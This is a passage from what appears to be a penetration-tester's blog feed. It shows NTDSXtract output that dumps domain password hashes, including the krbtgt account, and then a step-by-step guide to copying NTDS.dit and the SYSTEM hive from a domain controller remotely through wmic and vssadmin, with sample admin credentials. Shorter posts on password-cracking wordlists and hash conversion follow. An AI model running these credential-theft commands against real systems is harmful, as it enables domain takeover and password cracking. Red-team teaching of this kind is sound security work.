-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Password hashes:
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	Guest:$NT$823893adfad2ada6e1a414f3ebdf58f7:::
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Password history:
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Record ID:           &lt;span style=&#34;color:#ae81ff&#34;&gt;3564&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;User name:           user
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;User principal name: 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SAM Account name:    user
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SAM Account type:    SAM_NORMAL_USER_ACCOUNT
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;GUID: c5a5c87a-93b4-4d80-97a1-1c605b9b0c03
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SID:  S-1-5-21-3825330677-773554443-1603823854-1000
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;When created:         2012-08-22 03:12:59
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;When changed:         2013-06-07 02:51:54
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Account expires:      Never
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Password last set:    2013-03-14 03:25:11.793912
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Last logon:           2013-06-07 02:51:54.152191
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Last logon timestamp: 2013-06-07 02:51:54.152191
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Bad password time     2013-04-19 05:25:40.412670
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Logon count:          &lt;span style=&#34;color:#ae81ff&#34;&gt;67&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Bad password count:   &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;User Account Control:
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	NORMAL_ACCOUNT
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	PWD Never Expires
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Ancestors:
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	$ROOT_OBJECT$ net projectmentor Users user 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Password hashes:
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	user:$NT$88e4d9fabaecf3dec18dd80905521b29:::
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Password history:
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	user_nthistory0:$NT$88e4d9fabafcf3dec18dd80905521b29:::
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	user_nthistory1:$NT$0c61031f010b2fbb88fe449fbf262477:::
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	user_nthistory2:$NT$88e4dffabaecf3dec18dd80905521b29:::
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	user_lmhistory0:c869027e01c3c4fe7626a90c87cc7fed:::
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	user_lmhistory1:8be023cd858da1edd21b94907afe182c:::
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Record ID:           &lt;span style=&#34;color:#ae81ff&#34;&gt;3610&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;User name:           krbtgt
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;User principal name: 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SAM Account name:    krbtgt
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SAM Account type:    SAM_NORMAL_USER_ACCOUNT
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;GUID: 74e6bd0b-e4d5-42df-98d5-24f9060061c9
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SID:  S-1-5-21-3825330677-773554443-1603823854-502
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;When created:         2012-08-22 03:16:03
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;When changed:         2012-08-22 03:31:13
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Account expires:      Never
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Password last set:    2012-08-22 03:16:03.166457
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Last logon:           Never
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Last logon timestamp: Never
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Bad password time     Never
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Logon count:          &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Bad password count:   &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;User Account Control:
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	Disabled
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	NORMAL_ACCOUNT
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Ancestors:
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	$ROOT_OBJECT$ net projectmentor Users krbtgt 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Password hashes:
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	krbtgt:$NT$7253e8647254716b507a2dcb149ff2da:::
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Password history:
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	krbtgt_nthistory0:$NT$7253e86a7254716a507a2dcb149ff2da:::
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	krbtgt_lmhistory0:113926e06a31d182623633041b632929:::
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Record ID:           &lt;span style=&#34;color:#ae81ff&#34;&gt;3762&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;User name:           John Doe
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;User principal name: jdoe@projectmentor.net
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SAM Account name:    jdoe
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SAM Account type:    SAM_NORMAL_USER_ACCOUNT
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;GUID: bbf24c63-39a9-4cc4-8aa8-933f9ddee940
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SID:  S-1-5-21-3825330677-773554443-1603823854-1104
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;When created:         2012-08-22 04:10:52
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;When changed:         2013-06-05 13:04:11
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Account expires:      Never
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Password last set:    2013-04-19 07:11:49.849592
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Last logon:           2013-06-07 02:56:25.677855
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Last logon timestamp: 2013-06-05 13:04:11.674344
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Bad password time     2013-05-02 03:01:12.536251
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Logon count:          &lt;span style=&#34;color:#ae81ff&#34;&gt;242&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Bad password count:   &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;User Account Control:
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	NORMAL_ACCOUNT
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	PWD Never Expires
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Ancestors:
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	$ROOT_OBJECT$ net projectmentor Users John Doe 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Password hashes:
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	John Doe:$NT$88e4d9fabaecf3ded18dd80905511b29:::
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Password history:
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Record ID:           &lt;span style=&#34;color:#ae81ff&#34;&gt;3797&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;User name:           Random User
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;User principal name: randy@projectmentor.net
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SAM Account name:    randy
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SAM Account type:    SAM_NORMAL_USER_ACCOUNT
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;GUID: 2701eb29-628a-4568-a093-d33a7db10d04
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SID:  S-1-5-21-3825330677-773554443-1603823854-1108
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;When created:         2013-04-08 02:34:04
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;When changed:         2013-05-27 16:06:07
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Account expires:      Never
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Password last set:    2013-04-19 06:59:25.423280
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Last logon:           2013-04-08 02:34:10.482690
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Last logon timestamp: 2013-04-08 02:34:10.482690
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Bad password time     Never
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Logon count:          &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Bad password count:   &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;User Account Control:
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	NORMAL_ACCOUNT
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	PWD Never Expires
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Ancestors:
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	$ROOT_OBJECT$ net projectmentor Users Random User 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Password hashes:
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	Random User:$NT$88ead9fa5aecf3dec18dd80905521b29:::
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Password history:
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root@wpad:~/blog/NTDSXtract 1.0# 
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;All done. Start crackin&#39;&lt;/p&gt;
-</description>
-    </item>
-    
-    <item>
-      <title>Volume Shadow Copy NTDS.dit Domain Hashes Remotely - Part 1</title>
-      <link>https://malicious.link/post/2013/2013-06-10-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-1/</link>
-      <pubDate>Mon, 10 Jun 2013 13:11:03 +0000</pubDate>
-      
-      <guid>https://malicious.link/post/2013/2013-06-10-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-1/</guid>
-      <description>&lt;blockquote&gt;
-&lt;p&gt;This and part 2 are mostly just an update to &lt;a href=&#34;http://pauldotcom.com/2011/11/safely-dumping-hashes-from-liv.html&#34;&gt;http://pauldotcom.com/2011/11/safely-dumping-hashes-from-liv.html&lt;/a&gt; but without the need for VSSOwn, that and we are doing it remotely without the need for shell on the DC.&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;Ever run into a Domain Controller that wasn&amp;rsquo;t allowed to talk to the Internet, had insane AV and GPOs not allowing anyone to RDP in (Even Domain Admins) unless they provided some kind of voodo happy dance? Ya me neither, but here is how you can still dump domain hashes and hash history if you run into that case. Lets start&lt;/p&gt;
-&lt;p&gt;First authenticate to the domain controller and make sure you have a good working directory to use.&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;net use \\DC1 /user:DOMAIN\domainadminsvc domainadminsvc123
-dir \\DC1\C$
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Alright, lets say &amp;ldquo;TEMP&amp;rdquo; is there and it&amp;rsquo;s empty on the remote DC. The way we are going to run commands will not allow us to get results directly so we are going to use a temp file on the DC in &lt;code&gt;C:\TEMP&lt;/code&gt; where we already made sure is clear.&lt;/p&gt;
-&lt;p&gt;We are going to be using Volume Shadow Copies to pull the NTDS.dit file (Active Directory&amp;rsquo;s DB much like Window&amp;rsquo;s SAM file except that it stores the entire AD set of objects there), we also need the SYSTEM registry hive. You can get the SAM registry hive as well but that will only get local DC credentials.&lt;/p&gt;
-&lt;p&gt;So lets list the current volume shadow copies to see if we need to create one, from a Windows command prompt (or if you&amp;rsquo;ve installed wmic for Linux via &lt;a href=&#34;http://www.krenger.ch/blog/wmi-commands-from-linux/&#34;&gt;http://www.krenger.ch/blog/wmi-commands-from-linux/&lt;/a&gt; ) - this &lt;em&gt;IS&lt;/em&gt; an interactive command so this won&amp;rsquo;t work very nicely in a Meterpreter shell:&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;C:\temp&amp;gt;wmic /node:DC1 /user:DOMAIN\domainadminsvc /password:domainadminsvc123 process call create &amp;#34;cmd /c vssadmin list shadows 2&amp;gt;&amp;amp;1 &amp;gt; C:\tempoutput.txt&amp;#34;
-Executing (Win32_Process)-&amp;gt;Create()
-Method execution successful.
-Out Parameters:
-instance of __PARAMETERS
-{
-        ProcessId = 7304;
-        ReturnValue = 0;
-};
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;To break down this command:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;code&gt;wmic /node:DC1&lt;/code&gt; - tells it to interact with the WMI API on DC1&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;/user:DOMAIN\domainadminsvc /password:domainadminsvc123&lt;/code&gt; - authentication&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;process call create&lt;/code&gt; - WMI speak for create a process&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;cmd /c&lt;/code&gt; - vssadmin doesn&amp;rsquo;t operate outside of cmd for some reason&amp;hellip;&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;vssadmin list shadows&lt;/code&gt; - List any shadow volumes that already exist&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;2&amp;gt;&amp;amp;1 &amp;gt; C:\temp\output.txt&lt;/code&gt; - Take STDIN and STDERROR and throw it in a text file on DC1 C:\TEMP. Make sure you specify full path because you will be executing from within C:\Windows\System32 and its a pain to find anything in that directory. So if you just specify &amp;gt; bob.txt you get to hunt in C:\Windows\System32 or wherever WMI wants to execute you from for bob.txt&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;Process starts and then you need to view the output file by either copying it down, &lt;code&gt;type \DC1\C$\TEMP\output.txt&lt;/code&gt; or mount the C drive as a network share. Either way you should either see something like this:&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;C:\temp&amp;gt;type output.txt
-vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
-(C) Copyright 2001-2005 Microsoft Corp.
-
-Contents of shadow copy set ID: {671090fd-0198}
-   Contained 1 shadow copies at creation time: 5/31/2013 11:29:03 AM
-      Shadow Copy ID: {0863e309}
-         Original Volume: (C:)\\?\Volume{c44da10e-0154-11e1-b968-806e6f6e6963}\
-         Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
-         Originating Machine: wpad
-         Service Machine: wpad
-         Provider: &amp;#39;Microsoft Software Shadow Copy provider 1.0&amp;#39;
-         Type: ClientAccessibleWriters
-         Attributes: Persistent, Client-accessible, No auto release, Differential, Auto recovered
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;or&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;C:\temp&amp;gt;type output.txt
-vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
-(C) Copyright 2001-2005 Microsoft Corp.
-
-No items found that satisfy the query
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If there are no shadow copies or the ones there are too old (look at the creation time), you can create a shadow copy using the &amp;lsquo;vssadmin create shadow /for=C: command. (This command only applies to Server OS (Win2k3/Win2k8) but since those are the only two that commonly have NTDS.dit files we don&amp;rsquo;t have to remember this):&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;C:\temp&amp;gt;wmic /node:DC1 /user:DOMAIN\domainadminsvc /password:domainadminsvc123 process call create &amp;#34;cmd /c vssadmin create shadow /for=C: 2&amp;gt;&amp;amp;1 &amp;gt; C:\temp\output.txt&amp;#34;
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The other thing to keep in mind is that NTDS.dit isn&amp;rsquo;t always on the main drive. It is commonly on a &amp;ldquo;D&amp;rdquo; drive for safety if a HDD goes bad or something. But it should always be in a folder called NTDS. (By default this is C:WindowsNTDS)&lt;/p&gt;
-&lt;p&gt;Next we just copy the files out of the shadow copies. First the SYSTEM hive:&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;C:\temp&amp;gt;wmic /node:DC1 /user:DOMAIN\domainadminsvc /password:domainadminsvc123 process call create &amp;#34;cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM.hive 2&amp;gt;&amp;amp;1 &amp;gt; C:\temp\output.txt&amp;#34;
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Then the NTDS.dit (notice this one isn&amp;rsquo;t in System32):&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;C:\temp&amp;gt;wmic /node:DC1 /user:DOMAIN\domainadminsvc /password:domainadminsvc123 process call create &amp;#34;cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit C:\temp\NTDS.dit 2&amp;gt;&amp;amp;1 &amp;gt; C:\temp\output.txt&amp;#34;
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In Kali Linux you could use the WMIS package to do much the same thing:&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;root@kali:~# wmis -U DOMAIN\domainadminsvc%domainadminsvc123 //DC1 cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit C:\temp\NTDS.dit 2&amp;gt;&amp;amp;1 &amp;gt; C:\temp\output.txt
-NTSTATUS: NT_STATUS_OK - Success
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Copy those files to your own system for offline extraction which I&amp;rsquo;ll cover in part 2.&lt;/p&gt;
-</description>
-    </item>
-    
-    <item>
-      <title>Length Sorting Wordlists</title>
-      <link>https://malicious.link/post/2013/2013-03-18-length-sorting-wordlists/</link>
-      <pubDate>Mon, 18 Mar 2013 20:01:44 +0000</pubDate>
-      
-      <guid>https://malicious.link/post/2013/2013-03-18-length-sorting-wordlists/</guid>
-      <description>&lt;p&gt;This is one of those stupid simple things that are easy to forget so I&amp;rsquo;m posting it here. Wordlists and dictionaries are awesome for cracking password hashes, and although, thanks to things like Mimikatz and WCE I don&amp;rsquo;t have to, but there is times where it&amp;rsquo;s important.&lt;/p&gt;
-&lt;p&gt;Now, having John, Hashcat, or Cain go through a dictionary is a 1-for-1 hit, no time wasted no matter how it&amp;rsquo;s sorted and usually is best to sort them by most common first so you get earlier hits. However, if you start throwing rules into the mix that equation changes. If you have &amp;ldquo;iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii&amp;rdquo; on the 3rd line of your dictionary, testing every possible permutation where you replace an &amp;lsquo;i&amp;rsquo; with a 1 is going to take a very long time.&lt;/p&gt;
-&lt;p&gt;Both Hashcat and John deal with this by limiting the length where permutations occur. (HC/JTR peeps please correct me if I&amp;rsquo;m wrong). Cain on the other hand, will try every possibility and hang on the 3rd line for years (over exagerated). How do you solve that? Easy, remove any word over a certain length. While that does work, and very similar to what the HC/JTR do, I don&amp;rsquo;t like loosing words from my dictionary, so I tend to sort them by length. That way, all the nasty ones are near the end and I can scale back the rules on them.&lt;/p&gt;
-&lt;p&gt;To do that is very simple:&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;awk &amp;#39;{print length, $0}&amp;#39; rockyou.txt | sort -n | cut -d &amp;#34; &amp;#34; -f2- &amp;gt; rockyou_ls.txt
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Thats it. Basic, simple and stored here for reference.&lt;/p&gt;
-</description>
-    </item>
-    
-    <item>
-      <title>Intro to White Chapel</title>
-      <link>https://malicious.link/post/2013/2013-01-19-intro-to-white-chapel/</link>
-      <pubDate>Sat, 19 Jan 2013 02:50:08 +0000</pubDate>
-      
-      <guid>https://malicious.link/post/2013/2013-01-19-intro-to-white-chapel/</guid>
-      <description>&lt;p&gt;I made a slide deck to kind of explain my latest project. Basically I got fed up with having dictionaries, passwords, and cracking tools but no way to really do better collaboration in a team format as well as just better management for myself. &lt;/p&gt;
-&lt;p&gt;Please feel free to submit pull requests, issues if you think something is broken or want features, or whatever on the Github repo here:&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://github.com/mubix/WhiteChapel/&#34;&gt;https://github.com/mubix/WhiteChapel/&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;Here is the slide deck:&lt;/p&gt;
-&lt;iframe src=&#34;http://www.slideshare.net/slideshow/embed_code/16064224&#34; width=&#34;427&#34; height=&#34;356&#34; frameborder=&#34;0&#34; marginwidth=&#34;0&#34; marginheight=&#34;0&#34; scrolling=&#34;no&#34; style=&#34;border:1px solid #CCC;border-width:1px 1px 0;margin-bottom:5px&#34; allowfullscreen&gt; &lt;/iframe&gt; &lt;div style=&#34;margin-bottom:5px&#34;&gt; &lt;strong&gt; &lt;a href=&#34;https://www.slideshare.net/mubix/intro-to-white-chapel&#34; title=&#34;Intro to White Chapel&#34; target=&#34;_blank&#34;&gt;Intro to White Chapel&lt;/a&gt; &lt;/strong&gt; from &lt;strong&gt;&lt;a href=&#34;http://www.slideshare.net/mubix&#34; target=&#34;_blank&#34;&gt;Rob Fuller&lt;/a&gt;&lt;/strong&gt; &lt;/div&gt;
-&lt;p&gt;slideshare 16064224&lt;/p&gt;
-</description>
-    </item>
-    
-    <item>
-      <title>lm2ntlm with John the Ripper</title>
-      <link>https://malicious.link/post/2012/2012-10-24-lm2ntlm-with-john-the-ripper/</link>
-      <pubDate>Wed, 24 Oct 2012 15:03:58 +0000</pubDate>
-      
-      <guid>https://malicious.link/post/2012/2012-10-24-lm2ntlm-with-john-the-ripper/</guid>
-      <description>&lt;p&gt;Since I didn&amp;rsquo;t see any documentation bringing how to take an LM hash that you&amp;rsquo;ve cracked and convert it to the NTLM equivalent all in one place. And I google how to do it almost every time. I wanted to put all these links in one place and remember how to do it for john. Go-go-gadget blog-notes.&lt;/p&gt;
-&lt;p&gt;So there is this: &lt;a href=&#34;https://github.com/snarez/rcracki/blob/master/lm2ntlm.cpp&#34;&gt;https://github.com/snarez/rcracki/blob/master/lm2ntlm.cpp&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;And this: &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/blob/master/tools/lm2ntcrack.rb&#34;&gt;https://github.com/rapid7/metasploit-framework/blob/master/tools/lm2ntcrack.rb&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;And this: &lt;a href=&#34;http://www.securityfocus.com/tools/6696&#34;&gt;http://www.securityfocus.com/tools/6696&lt;/a&gt;&lt;/p&gt;
